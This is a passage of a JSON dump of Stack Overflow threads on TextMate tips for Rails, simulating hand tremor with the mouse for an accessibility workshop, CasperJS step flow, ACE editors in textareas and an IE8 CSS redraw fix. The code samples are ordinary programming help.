                    "body": "<p>Not Rails-related, but I can't say enough good things about the <a href=\"http://code.google.com/p/zen-coding/\" rel=\"nofollow\" title=\"Zen Coding\">Zen Coding</a> plugins for HTML &amp; CSS coding. A huge bunch of keyboard shortcuts that will completely change the way you use Textmate (if you do a lot of XHTML/CSS like I do). Watch the Screencasts to see just how quickly you can do common tasks with them.</p>\n\n<p>Another plugin that's been super awesome for me along the same lines is the <a href=\"http://github.com/kswedberg/jquery-tmbundle\" rel=\"nofollow\">jQuery Bundle</a> that adds keyboard shortcuts for a bunch of jQuery methods.</p>\n\n<p>Essentially, what I'm getting at here, is that with some diligent searching you can uncover a ton of community-built addons for Textmate that increase the functionality of this already awesome program.</p>\n\n<p>Most of the coders in my office use some variant of Eclipse, but I say they can pry my copy of Textmate from my cold, dead hands. :D</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Indeed, take a look at the bundles that are available and definitly keep it in mind if you find that you are repeating or using the same stuff a lot. You'll end up with a lot of snippets in no time!</p>\n\n<p>Think like <code>&lt;link rel=\"stylesheet\" href=\"/public/stylesheets/screen.css\"&gt;</code> can very easily be extracted into a snippet so the only thing you would have to type would be the link to the stylesheet itself.</p>\n\n<p>This might seem like not a big deal but just think about the amount of times you've had to type something like this. Mastering Textmate is all about saving yourself from unnecessary keystrokes and making it work for you instead of the other way around.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p><strong>Cmd-T ENTER</strong> lets you go back to the file you were previously editing. This is specially useful as TextMate doesn't support window split.</p>\n\n<p>Also, check out the <a href=\"http://github.com/josevalim/rails-footnotes\" rel=\"nofollow\">rails-footnotes plugin</a>. It adds links to the bottom of your rail-app layout that automatically open the view or controller files in TextMate. Those links only appear in development mode.</p>\n\n<p>Some of the other features that I use frequently are:</p>\n\n<ul>\n<li>Duplicate line: <strong>CTRL-SHIFT-D</strong></li>\n<li>Select line: Triple Click (works outside TM too)</li>\n<li>Move selection: <strong>CTRL-CMD-Arrow</strong></li>\n<li>Comment/Uncomment: <strong>CMD-/</strong></li>\n</ul>\n\n<p>Also, for maximum productivity, don't forget to set your keyword repeat rate to its maximum or <a href=\"http://www.macosxhints.com/article.php?story=20090823193018149\" rel=\"nofollow\">beyond</a>.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>For a list of most useful keyboard shortcuts for Rails development see my blog post: <a href=\"http://szeryf.wordpress.com/2010/02/15/textmate-shortcuts-you-should-be-using/\" rel=\"nofollow\">http://szeryf.wordpress.com/2010/02/15/textmate-shortcuts-you-should-be-using/</a></p>\n\n<p>You might also want to check out this bundle: <a href=\"http://github.com/szeryf/rails-routes.tmbundle\" rel=\"nofollow\">http://github.com/szeryf/rails-routes.tmbundle</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I use the latest version of textmate for all my Rails development needs and I feel that I'm under-using the possibilities or this software. I only installed the Ruby on Rails bundle and use little to no snippets / shortcuts. </p>\n\n<p>What do I absolutely HAVE to know / do in order to get the most out of my textmate in a web development environment? </p>\n\n<p><em>I would prefer Ruby on Rails oriented answers, but any html/js/css answers would be helpful.</em></p>\n\n<p><strong>Edit</strong>: Added a bounty to get more inputs on this.</p>\n",
            "last_activity_date": 1280259645,
            "question_id": 1380418,
            "score": 21,
            "tags": [
                "javascript",
                "html",
                "ruby-on-rails",
                "css"
            ],
            "title": "How to improve the way I use Textmate for Ruby on Rails, HTML, CSS and Javascript?"
        },
        {
            "answer_count": 13,
            "answers": [
                {
                    "body": "<p>I made a quick demo of something that you hopefully should be able to base your code on, using the <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Pointer_Lock_API\">Pointer Lock API</a>.</p>\n\n<p>I forked <a href=\"https://github.com/mdn/pointer-lock-demo\">this pointer-lock-demo repo</a> and modified it to add a random movement element.</p>\n\n<p>Here is the link to my GitHub page: <a href=\"https://aristocrates.github.io/pointer-lock-demo\">https://aristocrates.github.io/pointer-lock-demo</a><br>\nAnd here is the link to my repo: <a href=\"https://github.com/aristocrates/pointer-lock-demo\">https://github.com/aristocrates/pointer-lock-demo</a></p>\n\n<p>The javascript code of importance is contained in <code>app.js</code>, in the <code>canvasLoop(e)</code> method.</p>\n\n<p>The only thing I changed from the original demo was after the lines</p>\n\n<pre><code>x += movementX * 2;\ny += movementY * 2;\n</code></pre>\n\n<p>I added two lines to represent random movement:</p>\n\n<pre><code>x += Math.floor(Math.random()*3 - 1);\ny += Math.floor(Math.random()*3 - 1);\n</code></pre>\n\n<p>There are still plenty of things you could improve, but hopefully this can help you get started.</p>\n",
                    "is_accepted": false,
                    "score": 147
                },
                {
                    "body": "\n\n<h2>Non-javascript way</h2>\n\n<p>Actually, I like solutions, which may be based on javascript, since they are more likely web-related, and good chances are \u2014 OS-independent. However, I was thinking about \u2014 how to resolve your issue for all browsers, since javascript solutions, in this case, will be difficult to adjust for all possible browsers (I'm not sure if it's possible at all).</p>\n\n<p>So, as you've mentioned, there is another way \u2014 i.e. to emulate the behavior on OS level. This has another advantage too \u2014 you may be sure that for browser it looks 100% as it was human (because, well, it's driver which is sending the signal). So you may use driver/device-based solutions with any browsers (or even in situation, when javascript is disabled).</p>\n\n<h2>Linux</h2>\n\n<p>Unfortunately, involving driver/device immediately causes OS dependency. So for each OS you'll need own solution. In this post I'm focused on Linux-based solution (so, will work with Linux) \u2014 and Mac OS a little. With Linux, it's possible to write events to device explicitly, so below is sample of function with main loop:</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>int main()\n{\n    struct input_event event, event_end;\n\n    int  fd = open(\"/dev/input/event4\", O_RDWR);\n    long ma = getInteger(\"Enter max amplitude [points, 0..50]: \", 0, 50);\n    long ta = getInteger(\"Enter max wait time [usecs , 0..200000]: \", 0, 200000);\n    if (fd &lt; 0)\n    {\n        printf(\"Mouse access attempt failed:%s\\n\", strerror(errno));\n        return -1;\n    }\n    memset(&amp;event, 0, sizeof(event));\n    memset(&amp;event, 0, sizeof(event_end));\n    gettimeofday(&amp;event.time, NULL);\n    event.type = EV_REL;\n    gettimeofday(&amp;event_end.time, NULL);\n    event_end.type = EV_SYN;\n    event_end.code = SYN_REPORT;\n    event_end.value = 0;\n    while(1)\n    {\n        event.code  = rand() % 2 ? REL_X : REL_Y;\n        event.value = (rand() % 2 ? -1 : 1) * randomTill(ma);\n        write(fd, &amp;event, sizeof(event));\n        write(fd, &amp;event_end, sizeof(event_end));\n        usleep(randomTill(ta));\n    }\n    close(fd);\n    return 0;\n}\n</code></pre>\n\n<p>My <strong>full code</strong> for the issue be found <a href=\"http://pastebin.com/xwbx0W4g\">here</a>. \nThe program will ask for amplitude of \"tremor\" and it's frequency (thus, how many time in micro-seconds are between \"tremors\"). To emulate situation, it will force mouse to move randomly for <code>0..X</code> points in random direction (up-down-left-bottom) and wait randomly <code>0..Y</code> micro-seconds till next \"tremor\", there <code>X</code> is amplitude of \"tremor\" and <code>Y</code> is frequency of \"tremor\"</p>\n\n<p>Another thing may be to adapt the program for your system. The program is \"dummy\" and can't detect mouse by itself, so <code>\"/dev/input/event4\"</code> is hard-coded. To realize what may be identifier for your system you may try:</p>\n\n<pre class=\"lang-sh prettyprint-override\"><code>user@host:/path$ cat /proc/bus/input/devices | grep mouse\nH: Handlers=mouse0 event3 \nH: Handlers=mouse1 event4\n</code></pre>\n\n<p>And so possibilities are <code>\"event3\"</code> and <code>\"event4\"</code> \u2014 but for your system that may have other values. So, if that is different from currently used in C code, just change the corresponding line (so, line with <code>int  fd = open(\"/dev/input/event4\", O_RDWR);</code> and place your device instead of <code>event4</code>)</p>\n\n<p>A gif demo for this program (low frame rate, unfortunately, so keep image not too large) <a href=\"http://i.stack.imgur.com/YRHwE.gif\">here</a>. </p>\n\n<p>A little side note (if you don't know what to do with C code) \u2014 to compile program above, just use:</p>\n\n<pre class=\"lang-sh prettyprint-override\"><code>user@host:/path$ gcc -std=gnu99 file.c -o m\n</code></pre>\n\n<p>where <code>file.c</code> is the name of your C source code file, then you'll get executable, called <code>m</code> in your directory. Most likely you'll need permissions to write into mouse device directly, so you may use <code>sudo</code>:</p>\n\n<pre class=\"lang-sh prettyprint-override\"><code>user@host:/path$ sudo ./m\n</code></pre>\n\n<h2>Other OS</h2>\n\n<p>The logic will remain same:</p>\n\n<ul>\n<li>Find a way to access your mouse device</li>\n<li>Write event of moving mouse</li>\n<li>Apply randomization to your event</li>\n</ul>\n\n<p>That's it. For instance, Mac OS has its own way to work with mouse (not like Linux, Mac hasn't <em><code>procfs</code></em> as well), it's well-described <a href=\"http://stackoverflow.com/questions/2734117/simulating-mouse-input-programmatically-in-os-x\">here</a>. </p>\n\n<h2>As a conclusion</h2>\n\n<p>What is better \u2014 javascript or device-oriented solutions \u2014 is up to you, because certain condition (like cross-browser or cross-OS) may decide everything in this case. Therefore, I've provided guidelines together with certain working example of how to implement that on OS level. The benefit here is that solution is cross-browser, but as a cost we have OS-binded program. </p>\n",
                    "is_accepted": false,
                    "score": 36
                },
                {
                    "body": "<p>You can use an old-age simulation suit, such as the one described in <a href=\"http://www.dailymail.co.uk/health/article-2573779/Deafness-shaking-hands-shuffling-The-old-age-suit-used-teach-hospital-staff-feels-elderly.html\" rel=\"nofollow\">this</a> article... I suspect the hand-tremors part is just a vibrating motor strapped around the wrist, plus some thick gloves to make the hands generally clumsy.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Just an idea for getting the tremor \"right\", you can record the mouse movement of a real patient, this makes it more authentic when you tell people where the data comes from.</p>\n\n<p>There a scripts for letting a cat follow your mouse cursor, you could adjust one to let a second cursor follow (jump around) your cursor. The page is calculating the position of the the second cursor, so it can also determine if an click event is successful or not.</p>\n\n<p>If you can, please make it web based, you will reach a lot more people this way than asking them to install a program or activate flash or whatever there is.</p>\n",
                    "is_accepted": false,
                    "score": 14
                },
                {
                    "body": "<p>You can't expect anyone to be able to hold their hands perfectly steady, so one thing you can consider is, </p>\n\n<ol>\n<li>Explain to users what you're doing and, </li>\n<li>Make the clickable elements on the demo page much smaller than normal. </li>\n</ol>\n\n<p>My reasoning is (caveat, I am not an expert in ux or medicine) by making the click-able elements smaller, you creates a similar problem for most people that a person afflicted with Parkinson's disease would face with an everyday web site. </p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>Instead of trying to move the pointer, you could move the application (web page) instead. I wrote a simple html form that has some entry fields in it. When you move the mouse onto the form, the form moves.</p>\n\n<p>You can see <a href=\"http://jsfiddle.net/4a371qs8/\">a demo of the moving form at jsfiddle</a>. Try to click on one of the input fields to see the effect.</p>\n\n<p>I used the jquery <a href=\"http://api.jqueryui.com/shake-effect/\">shake</a> effect to achieve this. The javascript for the shake effect looks like this, and just causes the form to move up and down whenever the mouse is moved over it:</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n    $(document).ready(function() {\n        $(\"#toggle\").hover(function () {\n            $(this).effect(\"shake\", { direction: \"up\", times: 1, distance: 40}, 1000);\n        });\n    });\n&lt;/script&gt;\n</code></pre>\n\n<p>Although the form only moves up and down, I think it has the desired effect. You can play with the parameters (direction, times, distance, as well as the un-named \"1000\" above) to tweak the form movement.</p>\n",
                    "is_accepted": false,
                    "score": 10
                },
                {
                    "body": "<p>I did this as a joke once, on the <a href=\"http://murga-linux.com/puppy/viewtopic.php?p=659709#659709\">Puppy Linux Forum</a> and got the comment that:</p>\n\n<blockquote>\n  <p>People with Parkinson's won't think it's funny !!!</p>\n  \n  <p>Cure here is simply cntrl-C, luckily.</p>\n</blockquote>\n\n<p>Here is the shell script which requires <a href=\"https://github.com/jordansissel/xdotool\">xdotool</a></p>\n\n<pre><code>#!/bin/sh\nwhile :; do\n   xdotool mousemove_relative -- -$(($RANDOM % 10)) $(($RANDOM % 10))\n   xdotool mousemove_relative -- $(($RANDOM % 10)) -$(($RANDOM % 10))\n   sleep ${1:-.1} #adjust this as necessary for effect\ndone\n</code></pre>\n\n<p>Name as parkinson_sim and run with optional argument for the time between tremors which can be 0.001 to 999.0. </p>\n\n<blockquote>\n  <p>parkinson_sim [time_between_tremors_in_seconds] #default is 0.1</p>\n</blockquote>\n\n<p>I made the mistake of clicking on it myself instead of running it from the command line and quickly discovered how frustrating it must be.  It took me several tries to get a terminal window open to kill it.</p>\n",
                    "is_accepted": false,
                    "score": 23
                },
                {
                    "body": "<p>Your second idea (hide the cursor) is halfway to one that I think may work well for you:</p>\n\n<ul>\n<li>Hide the mouse cursor via CSS, as you suggest. (<code>cursor:none</code> IIRC)</li>\n<li>Instead of a shaky-cursor GIF, use some image + CSS absolute positioning + JS to emulate the mouse pointer; i.e., follow the mouse around the page and plant the cursor image where the mouse cursor natively would be.</li>\n</ul>\n\n<p>Then, you add some tremor math to your cursor code, to \"shake\" the cursor. Up to you to determine what the right curves are to properly simulate tremor input.</p>\n\n<p>Finally: for whatever controls you are programming (links, etc.):</p>\n\n<ul>\n<li>capture click events, nudge them to the current \"tremor\" location based on the state of your tremor curves, and bounds-check your elements to see if the user has shaken out of the element intended, or possibly into an element that was not intended.</li>\n</ul>\n\n<p><strong>One major bonus</strong> with this implementation: your 'shaky cursor' will be displayed on touch devices, which would not have a cursor to begin with.</p>\n\n<hr>\n\n<h3>Edit:</h3>\n\n<p>Based on Michael Theriot's (very clean and helpful!) base JSFiddle from the comments, here's one that tremors constantly with a normally-distributed sweep around the current cursor location: <a href=\"http://jsfiddle.net/benmosher/0x4mc64v/4/\">http://jsfiddle.net/benmosher/0x4mc64v/4/</a></p>\n\n<p>(The <code>normal</code> array is the result of calling <code>rnorm(100)</code> in my R console. Simplest way I could think of in JS to sample a normally-distributed random integer.)</p>\n",
                    "is_accepted": false,
                    "score": 15
                },
                {
                    "body": "<p>Why not use a hardware solution? There are certain mice out there that you can put weights in, like the Logitech G500. Instead of putting in a weight, put in a small oscillating motor that makes the mouse shake slightly. This also simulated the actual disorder more: it's not just the cursor that shakes, but the entire hand and mouse. And it also means you can show other software than websites.</p>\n\n<p>Instead of a mouse with a weight slot, you can also just tape something to the mouse, but that's more noticeable.</p>\n",
                    "is_accepted": false,
                    "score": 10
                },
                {
                    "body": "<p>As you were thinking about doing it with a custom mouse driver I suppose a small program running on the PC would do either? If this is the case, here is a small snippet for C#, which infinitely moves the cursor randomly withing a range of plus minus 5px around the current cursor position. After each displacement the program waits 50 ms to 100 ms (not accurate!). The shakiness can be configured by adapting the values for the displacement and the pauses. I ran this in a console application and - depending on the values - it gave me quite a hard time stopping the program.</p>\n\n<pre><code>Random rand = new Random();\n\nwhile(true)\n{\n    Cursor.Position = new Point() { X = Cursor.Position.X + rand.Next(11)-5, Y = Cursor.Position.Y + rand.Next(11)-5 };\n    Thread.Sleep(rand.Next(50) + 50);\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>Here is a windows version of my xdotool script that uses <a href=\"https://www.autoitscript.com\" rel=\"nofollow\">AutoIt</a>. This was my first ever AutoIt script, and it took only a couple of minutes to write, so I'm sure it can be improved.  Just save with the extension .au3 and run it with AutoIt (Run Script x86).</p>\n\n<pre><code>HotKeySet(\"{HOME}\", \"GStart\")\nHotKeySet(\"{PAUSE}\", \"Gpause\")\nHotKeySet(\"{ESC}\", \"Gexit\")\n\nWhile 1\n    Sleep(100)\nWEnd\n\nFunc Gstart()\nWhile 1\n    sleep(100)\n    $pos = MouseGetPos()\n    $x = $pos[0] + 10 - Random(0, 20, 1)\n    $y = $pos[1] + 10 - Random(0, 20, 1)\n    MouseMove($x,$y)\nWend\nEndfunc\n\n\nFunc Gpause()\nWhile 1\n   sleep(100)\nWend\nEndfunc\n\nFunc Gexit()\n    MsgBox(0, \"exit box\", \"Script exited\")\n    Exit 0\nEndFunc\n</code></pre>\n\n<p><strong>Controls</strong></p>\n\n<ul>\n<li>Home : Start simulation.</li>\n<li>pause : Pause simulation.</li>\n<li>Esc : Exit simulation.</li>\n</ul>\n\n<p>Or use my compiled version from <a href=\"https://dl.dropboxusercontent.com/u/57466078/parkinsim.exe\" rel=\"nofollow\">here</a>.</p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p><em>The low-level parts of simulating the tremor are well answered by now. I will add something focusing on the kind of tremor to simulate:</em></p>\n\n<p>Most answers implement a mouse cursor that is moving on a random path with some fixed maximal step width in X and Y direction.</p>\n\n<p>This should work well enough for the use case of making it hard to hit a specific area like a button.    </p>\n\n<p>For the more general issue of simulating UI problems caused by a tremor from Parkinson's disease, it would be at least interesting to actually simulate the hand movements of this kind of tremor.<br>\nI suspect the random walk may not be a very good <strong>approximation</strong>.</p>\n\n<p>It may be <strong>hard to get hold of real hand trace data</strong> of tremor movement of course, but there are certainly papers about analyzing this kind of tremor:</p>\n\n<p>The paper <a href=\"http://link.springer.com/chapter/10.1007%2F978-3-540-89208-3_22\" rel=\"nofollow\">Parametric Representation of Hand Movement in Parkinson\u2019s Disease</a> is about how to best plot 3D hand movement traces.<br>\nThe paper is paywalled, but the preview on the top right, labeled \"Look Inside >\" on the book image, shows some interesting plots of different <strong>representations of hand trace data</strong>.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<ul>\n<li>In your <code>DIV</code>, CSS-hide the cursor using <code>cursor:none;</code></li>\n<li>Create a .png Cursor image and move it (<code>left</code>, <code>top</code>) with jQ on <code>mousemove</code></li>\n<li>Randomize the .png <code>margin-left</code> and <code>margin-top</code> using a <code>setTimeout</code>\n(to make the re-positioning smooth use CSS3 <code>transition</code> or do it with jQ <code>.animate()</code>).</li>\n</ul>\n\n<p>Note: The script cannot know if the hand is still on the mouse ;)</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>function rand(min, max) {return Math.random() * (max - min) + min;}\r\n\r\nvar $cursor = $('div img');\r\n\r\n$('div').mousemove(function(e) {  // Make .png follow the mouse coordinates\r\n  $cursor.css({\r\n    left: e.pageX,\r\n    top:e.pageY\r\n  });\r\n}).hover(function(e){\r\n  $cursor.toggle(); // Show .png cursor as we enter the DIV\r\n});\r\n\r\n(function tremor(){ // Add tremor to .png image\r\n  $cursor.css({\r\n      marginLeft: rand(-15,15), // arm tremor\r\n      marginTop:  rand(-30,30)  // hand contractions\r\n  });\r\n  setTimeout(tremor, rand(50,100));\r\n}());</code></pre>\r\n<pre class=\"snippet-code-css lang-css prettyprint-override\"><code>div{\r\n  position:absolute;\r\n  background:#eee;\r\n  height:100%;\r\n  width:100%;\r\n  cursor:none;\r\n}\r\n\r\ndiv img{\r\n  display:none;\r\n  position:absolute;\r\n  transition: margin 0.2s;\r\n}</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;script src=\"https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js\"&gt;&lt;/script&gt;\r\n&lt;div&gt;&lt;img src=\"http://i.stack.imgur.com/KwMGA.png\"&gt;&lt;/div&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I'm working for a foundation that raises awareness for accessibility in the internet. For a presentation, we want to offer a small workshop that simulates different disabilities/impairments to people. This is done via a website created especially for this presentation.</p>\n\n<p>One of the demonstrated impairments is having a tremor, which means experiencing shaky, difficult-to-control hand movements. With this impairment, it's very difficult to move the mouse cursor exactly and to press the mouse button while the mouse is over a link. Both some old people and people with disease, e.g. Parkinson's, can suffer from tremor.</p>\n\n<p>Now I'd like to somehow move the mouse cursor in an unpredictable way, so that it's very hard for people to click on a small button. Because JavaScript doesn't allow moving the mouse cursor directly, I'm looking for other ways to achieve this. I came up with the following ideas:</p>\n\n<ul>\n<li>Using a mouse driver / utility that simulates the mouse shaking.</li>\n<li>Hide the mouse cursor via CSS, place a GIF animation of a shaking mouse cursor at the place of the original cursor (with JavaScript), and then make the target link clickable only every few seconds for a second or so. This would at least give the feeling as if one always clicks at the wrong moment.</li>\n</ul>\n\n<p>While the first idea would be pretty cool, I couldn't find a tool like this, whether for Mac nor for Windows. And I don't have any skills in programming such a thing myself.</p>\n\n<p>The second idea seems a bit clumsy, but it would achieve the desired effect, I think.</p>\n\n<p>Does anybody have another idea?</p>\n",
            "last_activity_date": 1418367378,
            "question_id": 25258921,
            "score": 188,
            "tags": [
                "javascript",
                "html",
                "css",
                "accessibility",
                "simulation"
            ],
            "title": "Simulating tremor (from e.g. Parkinson&#39;s Disease) with the mouse on a webpage?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p><code>then()</code> basically adds a new navigation step in a stack. A step is a javascript function  which can do two different things:</p>\n\n<ol>\n<li>waiting for the previous step - if any - being executed</li>\n<li>waiting for a requested url and related page to load</li>\n</ol>\n\n<p>Let's take a simple navigation scenario:</p>\n\n<pre><code>var casper = require('casper').create();\n\ncasper.start();\n\ncasper.then(function step1() {\n    this.echo('this is step one');\n});\n\ncasper.then(function step2() {\n    this.echo('this is step two');\n});\n\ncasper.thenOpen('http://google.com/', function step3() {\n    this.echo('this is step 3 (google.com is loaded)');\n});\n</code></pre>\n\n<p>You can print out all the created steps within the stack like this:</p>\n\n<pre><code>require('utils').dump(casper.steps.map(function(step) {\n    return step.toString();\n}));\n</code></pre>\n\n<p>That gives:</p>\n\n<pre><code>$ casperjs test-steps.js\n[\n    \"function step1() { this.echo('this is step one'); }\",\n    \"function step2() { this.echo('this is step two'); }\",\n    \"function _step() { this.open(location, settings); }\",\n    \"function step3() { this.echo('this is step 3 (google.com is loaded)'); }\"\n]\n</code></pre>\n\n<p>Notice the <code>_step()</code> function which has been added automatically by CasperJS to load the url for us; when the url is loaded, the next step available in the stack \u2014 which is <code>step3()</code> \u2014 is called.</p>\n\n<p>When you have defined your navigation steps, <code>run()</code> executes them one by one sequentially:</p>\n\n<pre><code>casper.run();\n</code></pre>\n\n<p><strong>Footnote:</strong> the callback/listener stuff is an implementation of the <a href=\"http://blog.thepete.net/blog/2011/07/02/javascript-promises/\">Promise pattern</a>.</p>\n",
                    "is_accepted": true,
                    "score": 54
                },
                {
                    "body": "<p><code>then()</code> merely registers a series of steps.</p>\n\n<p><code>run()</code> and its family of runner functions, callbacks, and listeners, are all what actually do the work of executing each step.</p>\n\n<p>Whenever a step is completed, CasperJS will check against 3 flags: <code>pendingWait</code>, <code>loadInProgress</code>, and <code>navigationRequested</code>.  If any of those flags is true, then do nothing, go idle until a later time (<code>setInterval</code> style).  If none of those flags is true, then the next step will get executed.</p>\n\n<p>As of CasperJS 1.0.0-RC4, a flaw exists, where, under certain time-based circumstances, the \"try to do next step\" method will be triggered before CasperJS had the time to raise either one of the <code>loadInProgress</code> or <code>navigationRequested</code> flags.  The solution is to raise one of those flags before leaving any step where those flags are expected to be raised (ex: raise a flag either before or after asking for a <code>casper.click()</code>), maybe like so:</p>\n\n<p><em>(Note: This is only illustrative, more like psuedocode than proper CasperJS form...)</em></p>\n\n<pre><code>step_one = function(){\n    casper.click(/* something */);\n    do_whatever_you_want()\n    casper.click(/* something else */); // Click something else, why not?\n    more_magic_that_you_like()\n    here_be_dragons()\n    // Raise a flag before exiting this \"step\"\n    profit()\n}\n</code></pre>\n\n<p>To wrap up that solution into a single-line of code, I introduced <code>blockStep()</code> in this github <a href=\"https://github.com/n1k0/casperjs/pull/264\">pull request</a>, extending <code>click()</code> and <code>clickLabel()</code> as a means to help guarantee that we get the expected behaviour when using <code>then()</code>.  Check out the request for more info, usage patterns, and minimum test files.</p>\n",
                    "is_accepted": false,
                    "score": 22
                }
            ],
            "body": "<p>I'm using CasperJS to automate a series of clicks, completed forms, parsing data, etc through a website.</p>\n\n<p>Casper seems to be organized into a list of preset steps in the form of <code>then</code> statements (see their example here: <a href=\"http://casperjs.org/quickstart.html\">http://casperjs.org/quickstart.html</a>) but it's unclear what triggers the next statement to actually run.</p>\n\n<p>For example, does <code>then</code> wait for all pending requests to complete? Does <code>injectJS</code> count as a pending request? What happens if I have a <code>then</code> statement nested - chained to the end of an <code>open</code> statement?</p>\n\n<pre><code>casper.thenOpen('http://example.com/list', function(){\n    casper.page.injectJs('/libs/jquery.js');\n    casper.evaluate(function(){\n        var id = jQuery(\"span:contains('\"+itemName+\"')\").closest(\"tr\").find(\"input:first\").val();\n        casper.open(\"http://example.com/show/\"+id); //what if 'then' was added here?\n    });\n});\n\ncasper.then(function(){\n    //parse the 'show' page\n});\n</code></pre>\n\n<p>I'm looking for a technical explanation of how the flow works in CasperJS.  My specific problem is that my last <code>then</code> statement (above) runs before my <code>casper.open</code> statement &amp; I don't know why.</p>\n",
            "last_activity_date": 1390586356,
            "question_id": 11604611,
            "score": 57,
            "tags": [
                "javascript",
                "casperjs"
            ],
            "title": "What Does &#39;Then&#39; Really Mean in CasperJS"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>You can have multiple Ace Editors. Just give each textarea an ID and create an Ace Editor for both IDS like so:</p>\n\n<pre><code>&lt;style&gt;\n#editor, #editor2 {\n    position: absolute;\n    width: 600px;\n    height: 400px;\n}\n&lt;/style&gt;\n&lt;div style=\"position:relative; height: 450px; \" &gt;\n&amp;nbsp;\n&lt;div id=\"editor\"&gt;some text&lt;/div&gt;\n&lt;/div&gt;\n&lt;div style=\"position:relative; height: 450px; \" &gt;\n&amp;nbsp;\n&lt;div id=\"editor2\"&gt;some text&lt;/div&gt;\n&lt;/div&gt;\n&lt;script src=\"ace.js\" type=\"text/javascript\" charset=\"utf-8\"&gt;&lt;/script&gt;\n&lt;script src=\"theme-twilight.js\" type=\"text/javascript\" charset=\"utf-8\"&gt;&lt;/script&gt;\n&lt;script src=\"mode-xml.js\" type=\"text/javascript\" charset=\"utf-8\"&gt;&lt;/script&gt;\n&lt;script&gt;\nwindow.onload = function() {\n    var editor = ace.edit(\"editor\");\n    editor.setTheme(\"ace/theme/twilight\");\n    var XmlMode = require(\"ace/mode/xml\").Mode;\n    editor.getSession().setMode(new XmlMode());\n\n    var editor2 = ace.edit(\"editor2\");\n    editor2.setTheme(\"ace/theme/twilight\");\n    editor2.getSession().setMode(new XmlMode());\n\n};\n&lt;/script&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 7
                },
                {
                    "body": "<p>To create an editor just do:</p>\n\n<p>HTML:</p>\n\n<pre><code>&lt;textarea id=\"code1\"&gt;&lt;/textarea&gt;\n&lt;textarea id=\"code2\"&gt;&lt;/textarea&gt;\n</code></pre>\n\n<p>JS:</p>\n\n<pre><code>var editor1 = ace.edit('code1');\nvar editor2 = ace.edit('code2');\neditor1.getSession().setValue(\"this text will be in the first editor\");\neditor2.getSession().setValue(\"and this in the second\");\n</code></pre>\n\n<p>CSS:</p>\n\n<pre><code>#code1, code2 { \n  position: absolute;\n  width: 400px;\n  height: 50px;\n}\n</code></pre>\n\n<p>They must be explicitly positioned and sized.  By show() and hide() I believe you are referring to the jQuery functions.  I'm not sure exactly how they do it, but it cannot modify the space it takes up in the DOM.  I hide and show using:</p>\n\n<pre><code>$('#code1').css('visibility', 'visible');\n$('#code2').css('visibility', 'hidden');\n</code></pre>\n\n<p>If you use the css property 'display' it will not work.</p>\n\n<p>Check out the wiki here for how to add themes, modes, etc... <a href=\"https://github.com/ajaxorg/ace/wiki/Embedding---API\" rel=\"nofollow\">https://github.com/ajaxorg/ace/wiki/Embedding---API</a></p>\n\n<p>Note: they do not have to be textareas, they can be whatever element you want.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>As far as I understood the idea of Ace, you shouldn't make a <strong>textarea</strong> an Ace editor itself. You should create an additional div and update textarea using <strong>.getSession()</strong> function instead.</p>\n\n<p>html</p>\n\n<pre><code>&lt;textarea name=\"description\"/&gt;\n&lt;div id=\"description\"/&gt;\n</code></pre>\n\n<p>js</p>\n\n<pre><code>var editor = ace.edit(\"description\");\nvar textarea = $('textarea[name=\"description\"]').hide();\neditor.getSession().setValue(textarea.val());\neditor.getSession().on('change', function(){\n  textarea.val(editor.getSession().getValue());\n});\n</code></pre>\n\n<p>or just call</p>\n\n<pre><code>textarea.val(editor.getSession().getValue());\n</code></pre>\n\n<p>only when you submit the form with the given textarea. I'm not sure whether this is the right way to use Ace, but it's the way it is used on <strong>GitHub</strong>.</p>\n",
                    "is_accepted": true,
                    "score": 92
                }
            ],
            "body": "<p>I'd like to be able to convert specific textareas on a page to be ACE editors.</p>\n\n<p>Does anyone have any pointers please?</p>\n\n<p>EDIT:</p>\n\n<p>I have the the editor.html file working with one textarea, but as soon as I add a second, the second isn't converted to an editor.</p>\n\n<p>EDIT 2:</p>\n\n<p>I decided to scrap the idea of having several, and instead open one up in a new window. My new predicament is that when I hide() and show() the textarea, the display goes awry. Any ideas?</p>\n",
            "last_activity_date": 1412238807,
            "question_id": 6440439,
            "score": 54,
            "tags": [
                "javascript",
                "textarea",
                "ace-editor"
            ],
            "title": "How do I make a textarea an ACE editor?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>Been trying to figure out the same thing. Basically IE8 doesn't redraw the pseudo elements unless you make a change to the content. So I've modified your example here <em>(just CSS)</em>: <a href=\"http://jsfiddle.net/lnrb0b/VWhv9/\">http://jsfiddle.net/lnrb0b/VWhv9/</a>. I've added <code>width:0</code> and <code>overflow:hidden</code> to the pseudo elements and then added <code>content:\"x\"</code> to each colour option where <strong>x</strong> is an incrementing number of spaces.</p>\n\n<p>It works for me; hope it helps you!</p>\n",
                    "is_accepted": true,
                    "score": 111
                },
                {
